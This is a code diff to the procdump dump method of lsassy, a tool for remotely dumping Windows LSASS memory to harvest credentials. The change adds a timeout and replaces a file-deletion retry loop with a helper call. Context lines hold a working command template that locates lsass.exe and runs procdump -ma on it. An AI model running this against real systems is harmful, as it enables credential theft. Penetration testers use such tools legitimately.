@@ -3,11 +3,12 @@ import os
 import time
 
 from lsassy.dumpmethod.idumpmethod import IDumpMethod
+from lsassy.impacketfile import ImpacketFile
 
 
 class DumpMethod(IDumpMethod):
-    def __init__(self, session):
-        super().__init__(session)
+    def __init__(self, session, timeout):
+        super().__init__(session, timeout)
         self.procdump = "procdump.exe"
         self.procdump_path = False
         self.procdump_remote_share = "C$"
@@ -43,19 +44,7 @@ class DumpMethod(IDumpMethod):
 
     def clean(self):
         if self.procdump_uploaded:
-            t = time.time()
-            while True:
-                try:
-                    self._session.smb_session.deleteFile(self.procdump_remote_share, self.procdump_remote_path + self.procdump)
-                    logging.debug("Procdump successfully deleted")
-                    return True
-                except Exception as e:
-
-                    if time.time() - t > 5:
-                        logging.warning("Procdump deletion error.")
-                        return False
-                    logging.debug("Procdump deletion error. Retrying...")
-                    time.sleep(0.2)
+            ImpacketFile.delete(self._session, self.procdump_remote_path + self.procdump, timeout=self._timeout)
 
     def get_commands(self, dump_path=None, dump_name=None, no_powershell=False):
         cmd_command = """for /f "tokens=2 delims= " %J in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do {}{} -accepteula -o -ma %J {}{}""".format(
